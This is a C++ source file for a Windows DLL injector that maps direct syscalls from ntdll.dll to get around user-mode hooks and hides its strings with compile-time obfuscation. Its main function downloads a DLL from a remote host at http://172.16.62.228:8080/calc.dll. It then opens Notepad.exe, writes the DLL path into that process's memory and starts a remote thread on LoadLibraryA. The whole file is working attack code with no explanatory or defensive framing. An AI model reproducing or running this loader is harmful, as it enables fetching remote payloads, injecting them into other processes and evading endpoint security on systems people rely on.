#include <Windows.h>
#include <iostream>
#include <string>
#include <sstream>
#include <tlhelp32.h>
#include "structures.h"
#include "structs.h"
#include "obfuscate.h"
#include <urlmon.h>
#pragma comment(lib, "urlmon.lib")

#define STATUS_SUCCESS 0

using namespace std;

int const SYSCALL_STUB_SIZE = 21;

MyNtOpenProcess _NtOpenProcess = NULL;
char OpenProcStub[SYSCALL_STUB_SIZE] = {};

MyNtAllocateVirtualMemory _NtAllocateVirtualMemory = NULL;
char AllocStub[SYSCALL_STUB_SIZE] = {};

MyNtWriteVirtualMemory _NtWriteVirtualMemory = NULL;
char WVMStub[SYSCALL_STUB_SIZE] = {};

MyNtProtectVirtualMemory _NtProtectVirtualMemory = NULL;
char ProtectStub[SYSCALL_STUB_SIZE] = {};

MyNtCreateThreadEx _NtCreateThreadEx = NULL;
char CreateThreadExStub[SYSCALL_STUB_SIZE];

PVOID RVAtoRawOffset(DWORD_PTR RVA, PIMAGE_SECTION_HEADER section)
{
	return (PVOID)(RVA - section->VirtualAddress + section->PointerToRawData);
}

BOOL MapSyscall(LPCSTR functionName, PIMAGE_EXPORT_DIRECTORY exportDirectory, LPVOID fileData, PIMAGE_SECTION_HEADER textSection, PIMAGE_SECTION_HEADER rdataSection, LPVOID syscallStub)
{
	PDWORD addressOfNames = (PDWORD)RVAtoRawOffset((DWORD_PTR)fileData + *(&exportDirectory->AddressOfNames), rdataSection);
	PDWORD addressOfFunctions = (PDWORD)RVAtoRawOffset((DWORD_PTR)fileData + *(&exportDirectory->AddressOfFunctions), rdataSection);

	for (size_t i = 0; i < exportDirectory->NumberOfNames; i++)
	{
		DWORD_PTR functionNameVA = (DWORD_PTR)RVAtoRawOffset((DWORD_PTR)fileData + addressOfNames[i], rdataSection);
		DWORD_PTR functionVA = (DWORD_PTR)RVAtoRawOffset((DWORD_PTR)fileData + addressOfFunctions[i + 1], textSection);
		LPCSTR functionNameResolved = (LPCSTR)functionNameVA;
		if (strcmp(functionNameResolved, functionName) == 0)
		{
			memcpy(syscallStub, (LPVOID)functionVA, SYSCALL_STUB_SIZE);
			return TRUE;
		}
	}

	return FALSE;
}

BOOL FindOpenProc(PIMAGE_EXPORT_DIRECTORY exportDirectory, LPVOID fileData, PIMAGE_SECTION_HEADER textSection, PIMAGE_SECTION_HEADER rdataSection)
{
	DWORD oldProtection;
	_NtOpenProcess = (MyNtOpenProcess)(LPVOID)OpenProcStub;
	BOOL status = VirtualProtect(OpenProcStub, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);
	if (MapSyscall(AY_OBFUSCATE("NtOpenProcess"), exportDirectory, fileData, textSection, rdataSection, OpenProcStub))
	{
		return TRUE;
	}
	return FALSE;
}

HANDLE CallOpenProc(DWORD pid)
{
	// variables for NtOpenProcess
	HANDLE hProcess = NULL;
	OBJECT_ATTRIBUTES zoa;
	InitializeObjectAttributes(&zoa, NULL, NULL, NULL, NULL, NULL);
	CLIENT_ID targetPid = { 0 };
	targetPid.UniqueProcess = (void*)pid;
	NTSTATUS success = NULL;
	success = _NtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &zoa, &targetPid);
	if (success != 0)
		return NULL;

	return hProcess;
}

BOOL FindAlloc(PIMAGE_EXPORT_DIRECTORY exportDirectory, LPVOID fileData, PIMAGE_SECTION_HEADER textSection, PIMAGE_SECTION_HEADER rdataSection)
{
	DWORD oldProtection;
	_NtAllocateVirtualMemory = (MyNtAllocateVirtualMemory)(LPVOID)AllocStub;
	VirtualProtect(AllocStub, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);

	if (MapSyscall(AY_OBFUSCATE("NtAllocateVirtualMemory"), exportDirectory, fileData, textSection, rdataSection, AllocStub))
	{
		return TRUE;
	}
	return FALSE;
}

BOOL FindWriteVirtualMemory(PIMAGE_EXPORT_DIRECTORY exportDirectory, LPVOID fileData, PIMAGE_SECTION_HEADER textSection, PIMAGE_SECTION_HEADER rdataSection)
{
	DWORD oldProtection;
	_NtWriteVirtualMemory = (MyNtWriteVirtualMemory)(LPVOID)WVMStub;
	VirtualProtect(WVMStub, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);

	if (MapSyscall(AY_OBFUSCATE("NtWriteVirtualMemory"), exportDirectory, fileData, textSection, rdataSection, WVMStub))
	{
		return TRUE;
	}
	return FALSE;
}

BOOL FindProtectVirtualMemory(PIMAGE_EXPORT_DIRECTORY exportDirectory, LPVOID fileData, PIMAGE_SECTION_HEADER textSection, PIMAGE_SECTION_HEADER rdataSection)
{

	DWORD oldProtection;
	_NtProtectVirtualMemory = (MyNtProtectVirtualMemory)(LPVOID)ProtectStub;
	VirtualProtect(ProtectStub, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);

	if (MapSyscall(AY_OBFUSCATE("NtProtectVirtualMemory"), exportDirectory, fileData, textSection, rdataSection, ProtectStub))
	{
		return TRUE;
	}
	return FALSE;
}

BOOL FindCreateThreadEx(PIMAGE_EXPORT_DIRECTORY exportDirectory, LPVOID fileData, PIMAGE_SECTION_HEADER textSection, PIMAGE_SECTION_HEADER rdataSection)
{
	DWORD oldProtection;
	_NtCreateThreadEx = (MyNtCreateThreadEx)(LPVOID)CreateThreadExStub;
	VirtualProtect(CreateThreadExStub, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);

	if (MapSyscall(AY_OBFUSCATE("NtCreateThreadEx"), exportDirectory, fileData, textSection, rdataSection, CreateThreadExStub))
	{
		return TRUE;
	}

	return FALSE;
}

BOOL EstablishSyscalls()
{
	LPVOID fileData = NULL;
	HANDLE file = NULL;
	DWORD fileSize = NULL;
	DWORD bytesRead = NULL;
	BOOL success = TRUE;

	file = CreateFileA(AY_OBFUSCATE("c:\\windows\\system32\\ntdll.dll"), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	fileSize = GetFileSize(file, NULL);
	fileData = HeapAlloc(GetProcessHeap(), 0, fileSize);
	if (!ReadFile(file, fileData, fileSize, &bytesRead, NULL))
		return FALSE;

	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)fileData;
	PIMAGE_NT_HEADERS imageNTHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)fileData + dosHeader->e_lfanew);
	DWORD exportDirRVA = imageNTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
	PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(imageNTHeaders);
	PIMAGE_SECTION_HEADER textSection = section;
	PIMAGE_SECTION_HEADER rdataSection = section;

	for (int i = 0; i < imageNTHeaders->FileHeader.NumberOfSections; i++)
	{
		if (strcmp((CHAR*)section->Name, (CHAR*)AY_OBFUSCATE(".rdata")) == 0) {
			rdataSection = section;
			break;
		}
		section++;
	}

	PIMAGE_EXPORT_DIRECTORY exportDirectory = (PIMAGE_EXPORT_DIRECTORY)RVAtoRawOffset((DWORD_PTR)fileData + exportDirRVA, rdataSection);

	// Assign Syscall values
	if (!FindOpenProc(exportDirectory, fileData, textSection, rdataSection))
		success = FALSE;
	if (!FindAlloc(exportDirectory, fileData, textSection, rdataSection))
		success = FALSE;
	if (!FindWriteVirtualMemory(exportDirectory, fileData, textSection, rdataSection))
		success = FALSE;
	if (!FindProtectVirtualMemory(exportDirectory, fileData, textSection, rdataSection))
		success = FALSE;
	if (!FindCreateThreadEx(exportDirectory, fileData, textSection, rdataSection))
		success = FALSE;


	if (file)
	{
		CloseHandle(file);
		file = NULL;
	}

	if (success)
		return TRUE;

	return FALSE;

}

DWORD GetPIDByName(const std::wstring& processName) {
	PROCESSENTRY32W pe32;
	pe32.dwSize = sizeof(PROCESSENTRY32W);

	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnapshot == INVALID_HANDLE_VALUE) {
		return 0;
	}

	if (Process32FirstW(hSnapshot, &pe32)) {
		do {
			if (std::wstring(pe32.szExeFile) == processName) {
				CloseHandle(hSnapshot);
				return pe32.th32ProcessID;
			}
		} while (Process32NextW(hSnapshot, &pe32));
	}

	CloseHandle(hSnapshot);
	return 0;
}

int main(int argc, char* argv[])
{
	HANDLE hProc = INVALID_HANDLE_VALUE;
	HANDLE hRemoteThread = INVALID_HANDLE_VALUE;
	LPVOID lpAllocationStart = nullptr;
	DWORD oldProtect;

	DWORD targetPid = GetPIDByName(L"Notepad.exe");

	string dwnld_URL = (string)AY_OBFUSCATE("http://172.16.62.228:8080/calc.dll");
	string savepath = (string)AY_OBFUSCATE("C:\\Users\\luisv\\Desktop\\calc.dll");
	HRESULT hres = URLDownloadToFile(NULL, wstring(dwnld_URL.begin(), dwnld_URL.end()).c_str(), wstring(savepath.begin(), savepath.end()).c_str(), 0, NULL);
	if (hres != S_OK) {
		printf(AY_OBFUSCATE("Failed to download DLL\n"));
		return FALSE;
	}
	
	SIZE_T szAllocation = sizeof(&savepath) + 1;

	if (!EstablishSyscalls())
		return 1;

	printf(AY_OBFUSCATE("Opening target process with PID %d\n"), targetPid);
	hProc = CallOpenProc(targetPid);
	if (hProc == INVALID_HANDLE_VALUE) {
		printf("Failed to open target process\n");
		return FALSE;
	}

	printf(AY_OBFUSCATE("Allocating %d bytes\n"), szAllocation);
	NTSTATUS status = _NtAllocateVirtualMemory(hProc, &lpAllocationStart, 0, &szAllocation, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (status != STATUS_SUCCESS)
	{
		printf(AY_OBFUSCATE("Failed to allocate memory\n"));
		return FALSE;
	}

	printf(AY_OBFUSCATE("Writing DLL path to 0x%p\n"), lpAllocationStart);
	status = _NtWriteVirtualMemory(hProc, lpAllocationStart, (PVOID)savepath.c_str(), szAllocation, NULL);
	if (status != STATUS_SUCCESS)
	{
		printf(AY_OBFUSCATE("Failed to write to allocated memory\n"));
		return FALSE;
	}

	printf(AY_OBFUSCATE("Changing memory permissions\n"));
	status = _NtProtectVirtualMemory(hProc, &lpAllocationStart, &szAllocation, PAGE_EXECUTE_READ, &oldProtect);
	if (status != STATUS_SUCCESS)
	{
		printf(AY_OBFUSCATE("Unable to change memory permissions\n"));
		return FALSE;
	}

	printf(AY_OBFUSCATE("Creating remote thread\n"));
	status = _NtCreateThreadEx(&hRemoteThread, PROCESS_ALL_ACCESS, NULL, hProc, (LPTHREAD_START_ROUTINE)LoadLibraryA, lpAllocationStart, FALSE, 0, 0, 0, NULL);

	if (hRemoteThread)
		CloseHandle(hRemoteThread);
	if (hProc)
		CloseHandle(hProc);

	if (status != STATUS_SUCCESS)
	{
		printf(AY_OBFUSCATE("CreateRemoteThread failed\n"));
		return FALSE;
	}

	printf(AY_OBFUSCATE("Success!"));
	return 0;
}